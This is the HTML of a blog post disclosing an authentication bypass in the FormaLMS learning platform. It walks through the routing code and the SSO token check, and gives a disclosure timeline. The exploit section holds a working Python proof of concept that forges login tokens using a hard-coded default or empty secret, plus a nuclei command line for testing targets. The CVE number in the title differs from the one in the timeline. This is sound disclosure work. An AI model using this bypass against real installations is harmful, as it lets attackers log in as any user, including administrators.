<!DOCTYPE html>
















































<html
  class="not-ready lg:text-base"
  style="--bg: #faf8f1"
  lang="en"
>
  <head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta
    name="viewport"
    content="width=device-width, initial-scale=1, shrink-to-fit=no"
  />

  
  <title>CVE-2023-4136 - FormaLMS The evil default value that leads to Authentication Bypass - Voidzone</title>

  
  <meta name="theme-color" />

  
  
  
  <meta name="description" content="Preface As part of a recent research activity, we stumbled upon FormaLMS. The project is an open source Learning Management System built by forma.association and aimed at companies who want a learning platform for internal employees, partners, dealers and sellers. The project is opensource and could be downloaded from the main website: formalms.org and the tested version is the 2.3. Update: the exploit is working on version &lt;= 2.4.4
Responsible disclosure timeline Date Notes 2021/10/02 Vulnerability has been found 2021/10/06 Notification has been sent 2021/10/21 No answer." />
  <meta name="author" content="Cristian &#39;void&#39; Giustini" />
  

  
  
  
  
  
  
  <link rel="preload stylesheet" as="style" href="https://voidzone.me/main.min.css" />

  
  <script
    defer
    src="https://voidzone.me/highlight.min.js"
    onload="hljs.initHighlightingOnLoad();"
  ></script>
  

  
   
  <link rel="preload" as="image" href="https://voidzone.me/theme.png" />

  
  
  
  <link rel="preload" as="image" href="https://www.gravatar.com/avatar/d4f904f245c1fd17d7f8fc7b662b7076?s=160&amp;d=identicon" />
  
  

  
  <link rel="preload" as="image" href="https://voidzone.me/twitter.svg" />
  
  <link rel="preload" as="image" href="https://voidzone.me/github.svg" />
  
  <link rel="preload" as="image" href="https://voidzone.me/linkedin.svg" />
  
  <link rel="preload" as="image" href="https://voidzone.me/mastodon.svg" />
  
  <link rel="preload" as="image" href="https://voidzone.me/steam.svg" />
  
  

  
  

  
  <link rel="icon" href="https://voidzone.me/favicon.ico" />
  <link rel="apple-touch-icon" href="https://voidzone.me/apple-touch-icon.png" />

  
  <meta name="generator" content="Hugo 0.115.4">

  
  

  
  
  
  
  
  
  
  <meta property="og:title" content="CVE-2023-4136 - FormaLMS The evil default value that leads to Authentication Bypass" />
<meta property="og:description" content="Preface As part of a recent research activity, we stumbled upon FormaLMS. The project is an open source Learning Management System built by forma.association and aimed at companies who want a learning platform for internal employees, partners, dealers and sellers. The project is opensource and could be downloaded from the main website: formalms.org and the tested version is the 2.3. Update: the exploit is working on version &lt;= 2.4.4
Responsible disclosure timeline Date Notes 2021/10/02 Vulnerability has been found 2021/10/06 Notification has been sent 2021/10/21 No answer." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://voidzone.me/posts/cve-2023-4136-formalms-authentication-bypss/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-11-02T00:00:00+00:00" />
<meta property="article:modified_time" content="2021-11-02T00:00:00+00:00" />

  
  <meta itemprop="name" content="CVE-2023-4136 - FormaLMS The evil default value that leads to Authentication Bypass">
<meta itemprop="description" content="Preface As part of a recent research activity, we stumbled upon FormaLMS. The project is an open source Learning Management System built by forma.association and aimed at companies who want a learning platform for internal employees, partners, dealers and sellers. The project is opensource and could be downloaded from the main website: formalms.org and the tested version is the 2.3. Update: the exploit is working on version &lt;= 2.4.4
Responsible disclosure timeline Date Notes 2021/10/02 Vulnerability has been found 2021/10/06 Notification has been sent 2021/10/21 No answer."><meta itemprop="datePublished" content="2021-11-02T00:00:00+00:00" />
<meta itemprop="dateModified" content="2021-11-02T00:00:00+00:00" />
<meta itemprop="wordCount" content="764">
<meta itemprop="keywords" content="" />
  
  <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="CVE-2023-4136 - FormaLMS The evil default value that leads to Authentication Bypass"/>
<meta name="twitter:description" content="Preface As part of a recent research activity, we stumbled upon FormaLMS. The project is an open source Learning Management System built by forma.association and aimed at companies who want a learning platform for internal employees, partners, dealers and sellers. The project is opensource and could be downloaded from the main website: formalms.org and the tested version is the 2.3. Update: the exploit is working on version &lt;= 2.4.4
Responsible disclosure timeline Date Notes 2021/10/02 Vulnerability has been found 2021/10/06 Notification has been sent 2021/10/21 No answer."/>

  
  
</head>

  <body class="text-black duration-200 ease-out dark:text-white">
    <header class="mx-auto flex h-[4.5rem] max-w-3xl px-8 lg:justify-center">
  <div class="relative z-50 mr-auto flex items-center">
    <a
      class="-translate-x-[1px] -translate-y-[1px] text-2xl font-semibold"
      href="https://voidzone.me/"
      >Voidzone</a
    >
    <div
      class="btn-dark text-[0] ml-4 h-6 w-6 shrink-0 cursor-pointer [background:url(./theme.png)_left_center/_auto_theme('spacing.6')_no-repeat] [transition:_background-position_0.4s_steps(5)] dark:[background-position:right]"
      role="button"
      aria-label="Dark"
    ></div>
  </div>

  <div
    class="btn-menu relative z-50 -mr-8 flex h-[4.5rem] w-[5rem] shrink-0 cursor-pointer flex-col items-center justify-center gap-2.5 lg:hidden"
    role="button"
    aria-label="Menu"
  ></div>

  
  <script>
    
    const htmlClass = document.documentElement.classList;
    setTimeout(() => {
      htmlClass.remove('not-ready');
    }, 10);

    
    const btnMenu = document.querySelector('.btn-menu');
    btnMenu.addEventListener('click', () => {
      htmlClass.toggle('open');
    });

    
    const metaTheme = document.querySelector('meta[name="theme-color"]');
    const lightBg = '#faf8f1'.replace(/"/g, '');
    const setDark = (isDark) => {
      metaTheme.setAttribute('content', isDark ? '#000' : lightBg);
      htmlClass[isDark ? 'add' : 'remove']('dark');
      localStorage.setItem('dark', isDark);
    };

    
    const darkScheme = window.matchMedia('(prefers-color-scheme: dark)');
    if (htmlClass.contains('dark')) {
      setDark(true);
    } else {
      const darkVal = localStorage.getItem('dark');
      setDark(darkVal ? darkVal === 'true' : darkScheme.matches);
    }

    
    darkScheme.addEventListener('change', (event) => {
      setDark(event.matches);
    });

    
    const btnDark = document.querySelector('.btn-dark');
    btnDark.addEventListener('click', () => {
      setDark(localStorage.getItem('dark') !== 'true');
    });
  </script>

  <div
    class="nav-wrapper fixed inset-x-0 top-full z-40 flex h-full select-none flex-col justify-center pb-16 duration-200 dark:bg-black lg:static lg:h-auto lg:flex-row lg:!bg-transparent lg:pb-0 lg:transition-none"
  >
    
    
    <nav class="lg:ml-12 lg:flex lg:flex-row lg:items-center lg:space-x-6">
      
      <a
        class="block text-center text-2xl leading-[5rem] lg:text-base lg:font-normal"
        href="/about/"
        >About</a
      >
      
    </nav>
    

    
    <nav
      class="mt-12 flex justify-center space-x-10 dark:invert lg:ml-12 lg:mt-0 lg:items-center lg:space-x-6"
    >
      
      <a
        class="h-8 w-8 text-[0] [background:var(--url)_center_center/cover_no-repeat] lg:h-6 lg:w-6"
        style="--url: url(./twitter.svg)"
        href="https://twitter.com/voidz0r"
        target="_blank"
        rel="me"
      >
        twitter
      </a>
      
      <a
        class="h-8 w-8 text-[0] [background:var(--url)_center_center/cover_no-repeat] lg:h-6 lg:w-6"
        style="--url: url(./github.svg)"
        href="https://github.com/voidz0r"
        target="_blank"
        rel="me"
      >
        github
      </a>
      
      <a
        class="h-8 w-8 text-[0] [background:var(--url)_center_center/cover_no-repeat] lg:h-6 lg:w-6"
        style="--url: url(./linkedin.svg)"
        href="https://linkedin.com/in/voidde"
        target="_blank"
        rel="me"
      >
        linkedin
      </a>
      
      <a
        class="h-8 w-8 text-[0] [background:var(--url)_center_center/cover_no-repeat] lg:h-6 lg:w-6"
        style="--url: url(./mastodon.svg)"
        href="https://infosec.exchange/@voidde"
        target="_blank"
        rel="me"
      >
        mastodon
      </a>
      
      <a
        class="h-8 w-8 text-[0] [background:var(--url)_center_center/cover_no-repeat] lg:h-6 lg:w-6"
        style="--url: url(./steam.svg)"
        href="https://steamcommunity.com/id/retvoid"
        target="_blank"
        rel="me"
      >
        steam
      </a>
      
    </nav>
    
  </div>
</header>


    <main
      class="prose prose-neutral relative mx-auto min-h-[calc(100%-9rem)] max-w-3xl px-8 pb-16 pt-12 dark:prose-invert"
    >
      

<article>
  <header class="mb-16">
    <h1 class="!my-0 pb-2.5">CVE-2023-4136 - FormaLMS The evil default value that leads to Authentication Bypass</h1>

    
    <div class="text-sm antialiased opacity-60">
      
      <time>Nov 2, 2021</time>
      
      
      
      
    </div>
    
  </header>

  <section><h2 id="preface">Preface</h2>
<p>As part of a recent research activity, we stumbled upon FormaLMS. The project is an open source Learning Management System built by forma.association and aimed at companies who want a learning platform for internal employees, partners, dealers and sellers.
The project is opensource and could be downloaded from the main website: formalms.org and the tested version is the 2.3.
Update: the exploit is working on version &lt;= 2.4.4</p>
<h2 id="responsible-disclosure-timeline">Responsible disclosure timeline</h2>
<table>
<thead>
<tr>
<th>Date</th>
<th>Notes</th>
</tr>
</thead>
<tbody>
<tr>
<td>2021/10/02</td>
<td>Vulnerability has been found</td>
</tr>
<tr>
<td>2021/10/06</td>
<td>Notification has been sent</td>
</tr>
<tr>
<td>2021/10/21</td>
<td>No answer. Sending second notification using the contact section of the website</td>
</tr>
<tr>
<td>2021/11/02</td>
<td>Public disclosure</td>
</tr>
<tr>
<td>2021/11/09</td>
<td>CVE-2021-43136 Assigned</td>
</tr>
</tbody>
</table>
<h2 id="digging-into-the-source">Digging into the source</h2>
<p>The application is written in PHP language and it uses custom routing logic to forward the requests to the specific controller. The architecture resemble the Model-View Controller one in a weird way and the requests are routed through the &ldquo;front controller&rdquo;, which is the index.php file located in the root of the project.</p>
<h2 id="the-routing-mechanism">The routing mechanism</h2>
<p>Once received, the front controller is responsible to parse the requested route via the r query string parameter, split the string by / and determine which controller and module to load (the green rectangle).
<img src="/formalms/image-45.png" alt="Routing mechanism"></p>
<p>A quick analysis on the <code>_homepage_base_</code> and <code>_homepagecatalog_base_</code> constants shows these values:
<img src="/formalms/image-46.png" alt="Constants"></p>
<p>So we can now reconstruct the routing mechanism:</p>
<ul>
<li>First part of the r parameter is the controller name (the red mark)</li>
<li>Second part is the module name (green mark)</li>
<li>Third part is the method name (orange mark)</li>
<li>A &ldquo;Controller&rdquo; static suffix is appended at the end (yellow mark)</li>
</ul>
<p><img src="/formalms/image-47.png" alt="MVC logics"></p>
<h2 id="the-authorization-mechanism">The authorization mechanism</h2>
<p>While it is obvious that the routing mechanism allows every user to arbitrarily call any class, the authorization mechanism denies some actions to the administrative part of the application such as the <code>AdminrulesAdmController</code> file.</p>
<p><img src="/formalms/image-48.png" alt="ACL 1">
<img src="/formalms/image-49.png" alt="ACL 2">
<img src="/formalms/image-50.png" alt="ACL 3"></p>
<p>So, in summary:</p>
<ul>
<li>The front controller, index.php, instantiate a new class based on the r input parameter and calls a constructor with the mvc name.</li>
<li>The destination class, AdminrulesAdmController in this case, which extends the AdmController and is a subclass of the Controller class, calls a constructor with the mvc name and, afterwards, the init function</li>
<li>The init() function of the &ldquo;AdmController&rdquo; is called and the checkRole() and checkPerms() are invoked based on the definition of the CORE constant, which is declared in various points of the code base.</li>
</ul>
<h2 id="the-vulnerability">The vulnerability</h2>
<p>While we had no luck trying to circumvent the authorization mechanism, one part of the index.php front controller caught my attention.
<img src="/formalms/image-51.png" alt="front controller"></p>
<p>Apparently, if the parameters login_user, time and token are passed to the query string, the application flows to a different location defined in the <code>_sso_</code> constant:
<img src="/formalms/image-52.png" alt="sso constant flow"></p>
<p>And, lastly, the part that clearly helped us to find the bug:
<img src="/formalms/image-53.png" alt="bugged code"></p>
<p>While it looks like that the developers were aware of this ugly default value (&ldquo;orribile questo default&rdquo; translates to &ldquo;This is an horrible default value&rdquo;), this was the part that motivated us to investigate further.</p>
<h2 id="digging-into-the-sso-function">Digging into the SSO function</h2>
<p>Until now, we know that in order to access the sso functionality, the sso_token setting should be enabled.
The &ldquo;sso&rdquo; setting is present in the admin section of the website and, as shown in the screenshots above, it accepts a NULL value for the secret parameter.</p>
<p><img src="/formalms/image-54.png" alt="admin panel"></p>
<h2 id="exploiting-the-flaw">Exploiting the flaw</h2>
<p>Knowing this, it is just a matter of sending an HTTP request on the index.php which contains:</p>
<ul>
<li><strong>login_user</strong>: the target username</li>
<li><strong>time</strong>: the expiration of the session in epoch format. Adding some time will be useful to circumvent the expiration check</li>
<li><strong>token</strong>: calculated like the following:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$recalc_token <span style="color:#f92672">=</span> <span style="color:#a6e22e">strtoupper</span>(<span style="color:#a6e22e">md5</span>($login_user <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;,&#39;</span> <span style="color:#f92672">.</span> $time <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;,&#39;</span> <span style="color:#f92672">.</span> $secret));
</span></span></code></pre></div><ul>
<li><strong>sso_secret</strong>: the default value, which is: 8ca0f69afeacc7022d1e589221072d6bcf87e39c or, in some cases, empty if the value of SSO secret for the token hash is set to empty.</li>
</ul>
<p>Following a simple PoC script that automates the process:​</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>secret <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;8ca0f69afeacc7022d1e589221072d6bcf87e39c&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">help</span>():
</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Usage: </span><span style="color:#e6db74">{</span>sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">0</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74"> username target_url&#34;</span>)
</span></span><span style="display:flex;"><span>  sys<span style="color:#f92672">.</span>exit()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">3</span>:
</span></span><span style="display:flex;"><span>    help()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>user, url <span style="color:#f92672">=</span> (sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>], sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>t <span style="color:#f92672">=</span> str(int(time<span style="color:#f92672">.</span>time()) <span style="color:#f92672">+</span> <span style="color:#ae81ff">5000</span>)
</span></span><span style="display:flex;"><span>token <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>md5(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>user<span style="color:#e6db74">}</span><span style="color:#e6db74">,</span><span style="color:#e6db74">{</span>t<span style="color:#e6db74">}</span><span style="color:#e6db74">,</span><span style="color:#e6db74">{</span>secret<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest()<span style="color:#f92672">.</span>upper()
</span></span><span style="display:flex;"><span>final_url <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/index.php?login_user=</span><span style="color:#e6db74">{</span>user<span style="color:#e6db74">}</span><span style="color:#e6db74">&amp;time=</span><span style="color:#e6db74">{</span>t<span style="color:#e6db74">}</span><span style="color:#e6db74">&amp;token=</span><span style="color:#e6db74">{</span>token<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;URL with default secret: </span><span style="color:#e6db74">{</span>final_url<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>token <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>md5(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>user<span style="color:#e6db74">}</span><span style="color:#e6db74">,</span><span style="color:#e6db74">{</span>t<span style="color:#e6db74">}</span><span style="color:#e6db74">,&#34;</span><span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest()<span style="color:#f92672">.</span>upper()
</span></span><span style="display:flex;"><span>final_url <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/index.php?login_user=</span><span style="color:#e6db74">{</span>user<span style="color:#e6db74">}</span><span style="color:#e6db74">&amp;time=</span><span style="color:#e6db74">{</span>t<span style="color:#e6db74">}</span><span style="color:#e6db74">&amp;token=</span><span style="color:#e6db74">{</span>token<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;URL with empty secret: </span><span style="color:#e6db74">{</span>final_url<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span></code></pre></div><p>And, finally, the bypass:
<img src="/formalms/image-55.png" alt="bypass"></p>
<h2 id="nuclei-template">Nuclei template</h2>
<p>Following a nuclei template, which could be useful for testing the vulnerability on single/multiple targets.
<strong>Note</strong>: the exploit uses blank value for the SSO Secret value, feel free to change it accordingly
The exploit needs environment variables in order to generate correct time in epoch format and token.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>time<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>date -d <span style="color:#e6db74">&#34;20 minutes&#34;</span> +<span style="color:#e6db74">&#34;%s&#34;</span><span style="color:#66d9ef">)</span>; token<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>echo -n <span style="color:#e6db74">&#34;admin,</span>$time<span style="color:#e6db74">,&#34;</span> | md5sum | cut -d <span style="color:#e6db74">&#39; &#39;</span> -f 1<span style="color:#66d9ef">)</span>;  ~/nuclei/v2/nuclei -u http://localhost:8085/formalms/ -t ~/nuclei-templates/vulnerabilities/formalms/formalms-auth-bypass.yaml -var login_user<span style="color:#f92672">=</span>admin -var time<span style="color:#f92672">=</span>$time -var token<span style="color:#f92672">=</span>$token -debug -v
</span></span></code></pre></div></section>

  
  

  
  
  
  <nav class="mt-24 flex rounded-lg bg-black/[3%] text-lg dark:bg-white/[8%]">
    
    <a
      class="flex w-1/2 items-center rounded-l-md p-6 pr-3 font-semibold no-underline hover:bg-black/[2%] dark:hover:bg-white/[3%]"
      href="https://voidzone.me/posts/cve-2022-29885-apache-tomcat-cluster-service-dos/"
      ><span class="mr-1.5">←</span><span>CVE-2022-29885 Apache Tomcat Cluster Service DoS</span></a
    >
    
    
    <a
      class="ml-auto flex w-1/2 items-center justify-end rounded-r-md p-6 pl-3 font-semibold no-underline hover:bg-black/[2%] dark:hover:bg-white/[3%]"
      href="https://voidzone.me/posts/sa-contrib-2021-036-notsosaml-miniorange-privilege-escalation-via-xml-signature-wrapping/"
      ><span>SA-CONTRIB-2021-036 - NotSoSAML - Privilege escalation via XML Signature Wrapping on Miniorange Drupal plugin</span><span class="ml-1.5">→</span></a
    >
    
  </nav>
  

  
  

  
  
</article>


    </main>

    <footer
  class="opaco mx-auto flex h-[4.5rem] max-w-3xl items-center px-8 text-[0.9em] opacity-60"
>
  <div class="mr-auto">
    &copy; 2023
    <a class="link" href="https://voidzone.me/">Voidzone</a>
  </div>
  <a class="link mx-6" href="https://gohugo.io/" rel="noopener" target="_blank"
    >Powered by Hugo️️</a
  >️
  <a
    class="link"
    href="https://github.com/nanxiaobei/hugo-paper"
    rel="noopener"
    target="_blank"
    >✎ Paper</a
  >
</footer>

  </body>
</html>
